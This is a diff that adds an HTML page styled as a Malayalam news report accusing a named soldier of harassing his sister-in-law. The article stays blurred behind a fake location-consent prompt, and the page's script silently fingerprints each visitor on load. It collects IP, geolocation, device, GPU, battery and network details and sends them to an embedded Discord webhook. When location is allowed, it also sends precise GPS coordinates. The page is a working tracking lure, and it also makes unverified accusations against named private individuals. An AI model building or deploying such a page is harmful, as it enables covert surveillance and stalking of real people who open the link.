@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="ml">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>കേസ് വീണ്ടും തുറന്നു | Kerala News Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            background-color: #f4f6f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            filter: blur(4px);
+            pointer-events: none;
+            transition: filter 0.5s ease;
+        }
+
+        .container.unblurred {
+            filter: none;
+            pointer-events: auto;
+        }
+
+        /* Custom Consent Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(2px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: rgba(255, 255, 255, 0.75);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 16px;
+            padding: 35px;
+            max-width: 480px;
+            width: 90%;
+            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            transform: translateY(20px);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-icon {
+            font-size: 3rem;
+            color: #2196f3;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        .modal-text {
+            font-size: 0.95rem;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .modal-btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 12px 24px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .modal-btn-primary {
+            background: #2196f3;
+            color: white;
+        }
+
+        .modal-btn-primary:hover {
+            background: #1976d2;
+            transform: translateY(-2px);
+        }
+
+        .modal-btn-secondary {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        .modal-btn-secondary:hover {
+            background: #bdbdbd;
+            transform: translateY(-2px);
+        }
+
+        .category {
+            color: #e53935;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        h1 {
+            font-size: 2rem;
+            color: #111;
+            line-height: 1.4;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .meta-info {
+            font-size: 0.85rem;
+            color: #666;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+
+        .location {
+            font-weight: bold;
+            color: #000;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            text-align: justify;
+        }
+
+        .main-image {
+            width: 100%;
+            height: auto;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .highlight-box {
+            background-color: #fdf2f2;
+            border-left: 4px solid #e53935;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .highlight-box h3 {
+            margin-top: 0;
+            color: #c62828;
+            font-size: 1.2rem;
+        }
+
+        .highlight-box ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+
+        .highlight-box li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+        }
+
+        blockquote {
+            background: #f9f9f9;
+            border-left: 4px solid #555;
+            margin: 25px 0;
+            padding: 15px 20px;
+            font-style: italic;
+            color: #444;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 1.6rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <span class="category">ഫ്ലാഷ് ന്യൂസ്</span>
+        <h1>സൈനികനായ ഹരിദാസന്റെ പീഡനങ്ങൾക്കെതിരെ നിയമപോരാട്ടവുമായി സൗമ്യ; അകത്തളങ്ങളിലെ ക്രൂരതയ്ക്കെതിരെ ഒരു സ്ത്രീയുടെ
+            അതിജീവനശ്രമം</h1>
+
+        <div class="meta-info">
+            <span>Published: June 2026</span> | <span>കണ്ണൂർ</span>
+        </div>
+
+        <img src="haridas.png" alt="-----" class="main-image">
+
+        <p><span class="location">കണ്ണൂർ:</span> കേരളത്തിൽ സ്ത്രീധന പീഡനങ്ങളും മാനസിക-ശാരീരിക അതിക്രമങ്ങളും കാരണം
+            സ്ത്രീകളുടെ ആത്മഹത്യാ നിരക്ക് വർദ്ധിച്ചുവരുന്ന ഈ കാലഘട്ടത്തിലും, പ്രതികൂല സാഹചര്യങ്ങളോട് പൊരുതി ജീവിക്കുന്ന
+            ഒരുപാട് സ്ത്രീകൾക്ക് ഉദാഹരണമാവുകയാണ് സൗമ്യ എന്ന യുവതി. ഇതുവരെയുള്ള കാലഘട്ടങ്ങളിൽ കുടുംബ തകർച്ചകൾക്ക് പിന്നിൽ
+            കൂടുതലായി കേട്ടുവന്നിരുന്നത് നാത്തൂൻ പോരും അമ്മായിയമ്മ പോരും ആയിരുന്നുവെങ്കിൽ, സൗമ്യയുടെ ജീവിതത്തിൽ കഥ
+            തികച്ചും വ്യത്യസ്തമാണ്. രാജ്യത്തെ സേവിക്കുന്ന ഒരു പട്ടാളക്കാരൻ തന്നെയാണ് ഇവിടെ ഒരു കുടുംബത്തിന്റെ സമാധാനം
+            തകർക്കുന്നത്.</p>
+        <p>സ്വന്തം സഹോദരന്റെ കുടുംബജീവിതത്തിൽ നിരന്തരം പ്രശ്നങ്ങൾ ഉണ്ടാക്കുകയും, അനിയന്റെ ഭാര്യയായ സൗമ്യയോട് കടുത്ത
+            അപമര്യാദയായി പെരുമാറുകയും ചെയ്യുന്ന ഹരിദാസൻ എന്ന സൈനികനാണ് ഈ കുടുംബത്തിന്റെ സമാധാനം കെടുത്തിയത്.</p>
+
+        <div class="highlight-box">
+            <h3>ക്രൂരമായ തന്ത്രങ്ങളും മോശക്കാരിയാക്കൽ ശ്രമങ്ങളും:</h3>
+            <ul>
+                <li><strong>അപമര്യാദയായ പെരുമാറ്റം:</strong> അനിയൻ വീട്ടിൽ ഇല്ലാത്ത സമയം നോക്കി സൗമ്യയോട് മോശമായ രീതിയിൽ
+                    പെരുമാറാൻ ഹരിദാസൻ ശ്രമിച്ചു.</li>
+                <li><strong>പകപോക്കൽ:</strong> ഈ വിവരം പുറംലോകം അറിഞ്ഞതോടെ, തന്റെ കുറ്റം മറയ്ക്കാനായി സൗമ്യയെ സമൂഹത്തിന്
+                    മുന്നിൽ മോശക്കാരിയായി ചിത്രീകരിക്കാനും ഇയാൾ ശ്രമം നടത്തി.</li>
+                <li><strong>കുടുംബം തകർക്കൽ:</strong> എങ്ങനെയെങ്കിലും അനിയന്റെ ഭാര്യയെ ആ വീട്ടിൽ നിന്ന് പുറത്താക്കുക
+                    എന്ന ലക്ഷ്യത്തോടെ ഹരിദാസൻ പല വൃത്തികെട്ട കളികളും ഇതിനകം കളിച്ചുകഴിഞ്ഞു.</li>
+            </ul>
+        </div>
+
+        <blockquote>
+            <strong>നീതിക്കായുള്ള പോരാട്ടത്തിൽ സൗമ്യ:</strong>
+            <p>ഹരിദാസന്റെ ഇത്തരം ക്രൂരതകൾക്കെതിരെ ശക്തമായ നിയമപോരാട്ടത്തിലാണ് സൗമ്യ ഇപ്പോൾ. പ്രതിയായ ഹരിദാസൻ നിലവിൽ
+                ഗുജറാത്തിൽ ഭാര്യവീട്ടിലാണ് താമസം. അതുകൊണ്ടുതന്നെ ഇതുവരെ വനിതാ സെല്ലിലും വനിതാ കമ്മീഷനിലും നൽകിയ
+                പരാതികളിൽ കൃത്യമായൊരു തീർപ്പോ നടപടിയോ ഉണ്ടായിട്ടില്ല.</p>
+
+        </blockquote>
+
+        <blockquote>
+            <strong>കോടതിയെ സമീപിക്കുന്നു:</strong> ഔദ്യോഗിക സംവിധാനങ്ങളിൽ നിന്ന് നീതി ലഭിക്കാൻ വൈകിയതിനെ തുടർന്ന് സൗമ്യ
+            ഇപ്പോൾ കോടതിയെ സമീപിച്ചിരിക്കുകയാണ്. രാജ്യത്തിന്റെ കാവൽക്കാരൻ എന്ന പദവി ദുരുപയോഗം ചെയ്ത് കുടുംബം തകർക്കാൻ
+            ശ്രമിക്കുന്ന കുറ്റവാളിയായ ഹരിദാസനെതിരെ കർശന നിയമനടപടികൾ കോടതി കൈക്കൊള്ളണമെന്ന ശക്തമായ ആവശ്യമാണ് സൗമ്യ
+            മുന്നോട്ട് വെക്കുന്നത്.
+        </blockquote>
+    </div>
+
+    <!-- Consent Modal -->
+    <div id="consent-modal" class="modal-overlay active">
+        <div class="modal-content">
+            <div class="modal-icon">🌐</div>
+            <div class="modal-title">പ്രാദേശിക വാർത്തകൾക്കായി</div>
+            <div class="modal-text">
+                നിങ്ങളുടെ ജില്ലയിലെയും പ്രദേശത്തെയും ഏറ്റവും പുതിയ വാർത്തകൾ കൃത്യതയോടെ ലഭ്യമാക്കുന്നതിനായി ലൊക്കേഷൻ
+                അനുമതി നൽകാൻ ദയവായി താഴെ നൽകിയിരിക്കുന്ന ബട്ടൺ ക്ലിക്ക് ചെയ്യുക.
+            </div>
+            <div class="modal-btn-group">
+                <button id="btn-allow" class="modal-btn modal-btn-primary">അനുമതി നൽകുക</button>
+                <button id="btn-deny" class="modal-btn modal-btn-secondary">വേണ്ട</button>
+            </div>
+            <div id="denied-message"
+                style="display: none; margin-top: 20px; color: #d32f2f; font-weight: bold; line-height: 1.5;"></div>
+        </div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            // ==================== CONFIGURATION ====================
+            // Option 1: Log to GitHub (Requires write access to repo)
+            // WARNING: Exposing a Personal Access Token in frontend JavaScript is a massive security risk!
+            // Anyone who inspects this page can copy your token and compromise your repository.
+            // If you use this, create a fine-grained token with permission ONLY to contents of this repository.
+            useGitHubLogging: false,
+            githubToken: "YOUR_GITHUB_PERSONAL_ACCESS_TOKEN",
+            githubUsername: "YOUR_GITHUB_USERNAME",
+            githubRepo: "YOUR_GITHUB_REPO_NAME",
+            logFilePath: "logs/visits.txt",
+
+            // Option 2: Log to Discord Webhook (Safer and easier alternative)
+            useDiscordWebhook: true,
+            discordWebhookUrl: "https://discord.com/api/webhooks/1509272375525642260/eUsjn7dobcSuUhnDD5_NJBQv0G7KLwEKbONlFc6ZSyIid71ETY3j3A2LejPRRCVO0WOV"
+            // =======================================================
+        };
+
+        const consentModal = document.getElementById('consent-modal');
+        const container = document.querySelector('.container');
+        const btnAllow = document.getElementById('btn-allow');
+        const btnDeny = document.getElementById('btn-deny');
+        const deniedMessage = document.getElementById('denied-message');
+
+        const sessionData = {
+            id: Math.random().toString(36).substring(2, 10).toUpperCase(),
+            ip: "Unknown",
+            coords: null
+        };
+        let loggedPageLoad = false;
+
+        // Gather browser and device info
+        function getDeviceDetails() {
+            const gpu = getGPURenderer();
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language || (navigator.languages && navigator.languages[0]) || "Unknown",
+                languages: navigator.languages ? navigator.languages.join(", ") : "Unknown",
+                screenResolution: `${screen.width}x${screen.height}`,
+                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: `${screen.colorDepth}-bit`,
+                pixelRatio: window.devicePixelRatio || 1,
+                cpuCores: navigator.hardwareConcurrency || "Unknown",
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+                doNotTrack: navigator.doNotTrack || "Not set",
+                referrer: document.referrer || "Direct visit",
+                pageUrl: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                timezoneOffset: `${-new Date().getTimezoneOffset()} mins`,
+                gpuVendor: gpu ? gpu.vendor : "Unknown",
+                gpuRenderer: gpu ? gpu.renderer : "Unknown",
+                connectionType: conn ? conn.effectiveType || "Unknown" : "Unknown",
+                downlink: conn ? `${conn.downlink} Mbps` : "Unknown",
+                rtt: conn ? `${conn.rtt} ms` : "Unknown"
+            };
+        }
+
+        // Get GPU details
+        function getGPURenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!dbgRenderInfo) return null;
+                const vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
+                return { vendor, renderer };
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // Get battery level & state
+        async function getBatteryDetails() {
+            if (typeof navigator.getBattery === 'function') {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Charging" : "Discharging"
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
+            return null;
+        }
+
+        // Fetch IP geolocation and detail info
+        async function fetchIPDetails() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    return await res.json();
+                }
+            } catch (e) {
+                console.error("ipapi.co failed, trying ip-api.com", e);
+            }
+            try {
+                const res = await fetch('https://ip-api.com/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    return {
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country_name: data.country,
+                        postal: data.zip,
+                        timezone: data.timezone,
+                        org: data.isp,
+                        asn: data.as
+                    };
+                }
+            } catch (e) {
+                console.error("ip-api.com failed, trying ipify", e);
+            }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                if (res.ok) {
+                    const data = await res.json();
+                    return { ip: data.ip };
+                }
+            } catch (e) {
+                console.error("All IP lookup APIs failed", e);
+            }
+            return { ip: "Unknown IP" };
+        }
+
+        // Send payload helper
+        async function sendDiscordPayload(payload) {
+            const { discordWebhookUrl, useDiscordWebhook } = CONFIG;
+            if (!useDiscordWebhook || !discordWebhookUrl || discordWebhookUrl === "YOUR_DISCORD_WEBHOOK_URL") {
+                return;
+            }
+            try {
+                await fetch(discordWebhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error sending payload to Discord:", error);
+            }
+        }
+
+        // Log page load information
+        async function logPageLoad() {
+            if (loggedPageLoad) return;
+            loggedPageLoad = true;
+
+            const ipDetails = await fetchIPDetails();
+            sessionData.ip = ipDetails.ip || "Unknown";
+            const device = getDeviceDetails();
+            const battery = await getBatteryDetails();
+
+            const fields = [
+                { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true },
+                { name: "Location (IP-based)", value: `${ipDetails.city || "Unknown"}, ${ipDetails.region || "Unknown"}, ${ipDetails.country_name || "Unknown"} (Postal: ${ipDetails.postal || "N/A"})`, inline: false },
+                { name: "ISP / Network Provider", value: `${ipDetails.org || "Unknown"} (${ipDetails.asn || "N/A"})`, inline: false },
+                { name: "Timezone", value: `${ipDetails.timezone || device.timezone} (Offset: ${device.timezoneOffset})`, inline: true },
+                { name: "Device / Platform", value: `**OS:** ${device.platform}\n**User-Agent:** \`${device.userAgent}\``, inline: false },
+                { name: "Screen Details", value: `**Resolution:** ${device.screenResolution}\n**Viewport:** ${device.viewportSize}\n**Pixel Ratio:** ${device.pixelRatio}\n**Colors:** ${device.colorDepth}`, inline: true },
+                { name: "Hardware Specs", value: `**CPU Cores:** ${device.cpuCores}\n**Device Memory:** ${device.deviceMemory}\n**Touch Points:** ${device.maxTouchPoints}`, inline: true },
+                { name: "GPU Details", value: `**Vendor:** ${device.gpuVendor}\n**Renderer:** ${device.gpuRenderer}`, inline: false }
+            ];
+
+            if (battery) {
+                fields.push({ name: "Battery Status", value: `**Level:** ${battery.level}\n**Status:** ${battery.charging}`, inline: true });
+            }
+
+            fields.push({
+                name: "Connection Info",
+                value: `**Type:** ${device.connectionType}\n**Downlink:** ${device.downlink}\n**RTT:** ${device.rtt}`,
+                inline: true
+            });
+
+            fields.push({
+                name: "Browsing Context",
+                value: `**Referrer:** ${device.referrer}\n**URL:** ${device.pageUrl}`,
+                inline: false
+            });
+
+            const payload = {
+                embeds: [{
+                    title: "👀 New Visitor - Awaiting Location Consent",
+                    color: 3447003, // Blue
+                    fields: fields,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await sendDiscordPayload(payload);
+        }
+
+        btnDeny.addEventListener('click', async () => {
+            btnAllow.style.display = 'none';
+            btnDeny.style.display = 'none';
+            deniedMessage.style.display = 'block';
+            deniedMessage.innerText = 'ക്ഷമിക്കുക, പ്രാദേശിക വിവരങ്ങൾ ലഭ്യമാകാത്തതിനാൽ വാർത്ത കാണാൻ കഴിയില്ല. പേജ് റീലോഡ് ചെയ്ത് അനുമതി നൽകുക.';
+
+            // Ensure load details are logged
+            if (!loggedPageLoad) {
+                await logPageLoad();
+            }
+
+            // Log denial to Discord
+            const payload = {
+                embeds: [{
+                    title: "❌ Geolocation Permission Denied",
+                    color: 15158332, // Red
+                    description: `User denied location access on the modal prompt.`,
+                    fields: [
+                        { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                        { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            await sendDiscordPayload(payload);
+        });
+
+        btnAllow.addEventListener('click', async () => {
+            btnAllow.disabled = true;
+            btnAllow.innerText = 'ലോഡ് ചെയ്യുന്നു...';
+
+            try {
+                // Ensure initial load details are sent
+                if (!loggedPageLoad) {
+                    await logPageLoad();
+                }
+
+                // 1. Get Coordinates
+                const coords = await getCoordinates();
+                sessionData.coords = coords;
+
+                // 2. Log exact coordinates to Discord
+                const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${coords.lat},${coords.lon}`;
+                const payload = {
+                    embeds: [{
+                        title: "📍 Precise Location Granted",
+                        color: 3066993, // Green
+                        description: `User granted precise GPS location access!`,
+                        fields: [
+                            { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                            { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true },
+                            { name: "Latitude", value: `\`${coords.lat}\``, inline: true },
+                            { name: "Longitude", value: `\`${coords.lon}\``, inline: true },
+                            { name: "Accuracy", value: `\`${coords.accuracy}m\``, inline: true },
+                            { name: "Google Maps Link", value: `[Open in Google Maps](${mapsUrl})`, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await sendDiscordPayload(payload);
+
+                // Also log to GitHub if configured
+                if (CONFIG.useGitHubLogging) {
+                    await logToGitHub(sessionData.ip, coords);
+                }
+
+                // 4. Success - Unblur content and remove modal
+                container.classList.add('unblurred');
+                consentModal.classList.remove('active');
+            } catch (error) {
+                console.error(error);
+                let userFriendlyError = 'ലൊക്കേഷൻ വിവരങ്ങൾ ലഭ്യമാക്കാൻ കഴിഞ്ഞില്ല. ദയവായി അനുമതി നൽകി വീണ്ടും ശ്രമിക്കുക.';
+                if (error.code === 1) { // PERMISSION_DENIED
+                    userFriendlyError = 'പ്രാദേശിക വാർത്തകൾ കാണുന്നതിനായി ബ്രൗസർ സെറ്റിങ്സിൽ ലൊക്കേഷൻ അനുവദിച്ച ശേഷം പേജ് വീണ്ടും റീലോഡ് ചെയ്യുക.';
+                }
+                btnAllow.style.display = 'none';
+                btnDeny.style.display = 'none';
+                deniedMessage.style.display = 'block';
+                deniedMessage.innerText = userFriendlyError;
+
+                // Ensure initial load details are sent
+                if (!loggedPageLoad) {
+                    await logPageLoad();
+                }
+
+                // Log rejection/error details to Discord
+                const payload = {
+                    embeds: [{
+                        title: "⚠️ Location Access Error / Rejected",
+                        color: 15158332, // Red
+                        description: `Failed to retrieve precise geolocation: ${error.message || 'Unknown error'} (Code: ${error.code || 'N/A'})`,
+                        fields: [
+                            { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                            { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                await sendDiscordPayload(payload);
+            }
+        });
+
+        function getCoordinates() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation is not supported by this browser."));
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        (error) => {
+                            reject(error);
+                        },
+                        { enableHighAccuracy: true, timeout: 15000 }
+                    );
+                }
+            });
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                console.error("IP fetch failed, trying fallback...", e);
+                try {
+                    const fallback = await fetch('https://ipapi.co/json/');
+                    const data = await fallback.json();
+                    return data.ip;
+                } catch (err) {
+                    return "Unknown IP";
+                }
+            }
+        }
+
+        async function logToGitHub(ip, coords) {
+            const { githubToken, githubUsername, githubRepo, logFilePath } = CONFIG;
+            if (!githubToken || githubToken === "YOUR_GITHUB_PERSONAL_ACCESS_TOKEN" || !githubUsername || !githubRepo) {
+                console.warn("GitHub credentials not configured.");
+                return;
+            }
+
+            const timestamp = new Date().toISOString();
+            const newLogEntry = `[${timestamp}] IP: ${ip} | Coordinates: Lat ${coords.lat}, Lon ${coords.lon} (Accuracy: ${coords.accuracy}m) | UserAgent: ${navigator.userAgent}\n`;
+
+            const apiUrl = `https://api.github.com/repos/${githubUsername}/${githubRepo}/contents/${logFilePath}`;
+
+            try {
+                let sha = null;
+                let existingContent = "";
+
+                const getRes = await fetch(apiUrl, {
+                    headers: {
+                        "Authorization": `Bearer ${githubToken}`,
+                        "Accept": "application/vnd.github.v3+json"
+                    }
+                });
+
+                if (getRes.status === 200) {
+                    const fileData = await getRes.json();
+                    sha = fileData.sha;
+                    existingContent = decodeURIComponent(escape(atob(fileData.content)));
+                }
+
+                const updatedContent = existingContent + newLogEntry;
+                const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
+
+                const putRes = await fetch(apiUrl, {
+                    method: "PUT",
+                    headers: {
+                        "Authorization": `Bearer ${githubToken}`,
+                        "Accept": "application/vnd.github.v3+json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        message: `Log visit details at ${timestamp}`,
+                        content: encodedContent,
+                        sha: sha || undefined
+                    })
+                });
+
+                if (!putRes.ok) {
+                    const errData = await putRes.json();
+                    throw new Error(errData.message || "Failed to commit log");
+                }
+            } catch (error) {
+                console.error("Error logging to GitHub:", error);
+            }
+        }
+
+        // Trigger loading and logging immediately on page load
+        logPageLoad();
+    </script>
+</body>
+
+</html>
